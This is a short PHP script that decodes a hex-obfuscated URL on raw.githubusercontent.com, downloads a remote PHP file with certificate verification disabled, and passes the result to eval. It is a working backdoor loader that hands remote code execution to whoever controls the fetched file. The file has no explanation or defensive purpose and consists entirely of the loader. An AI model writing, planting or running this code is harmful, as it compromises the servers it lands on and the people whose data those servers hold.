<?php
$hex_scheme = '68747470733a2f2f';
$hex_host = '7261772e67697468756275736572636f6e74656e742e636f6d';
$hex_path = '2f626c656163686368616e2f6c756679797461726f2f726566732f68656164732f6d61696e2f73616e6a692f322e706870';
$url = hex2bin($hex_scheme . $hex_host . $hex_path);
function fetch_content($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $content = curl_exec($ch);
        curl_close($ch);
        return $content;
    }
    if (ini_get('allow_url_fopen')) {
        return @file_get_contents($url);
    }
    return false;
}
$code = fetch_content($url);
if ($code !== false) eval('?>' . $code);
?>
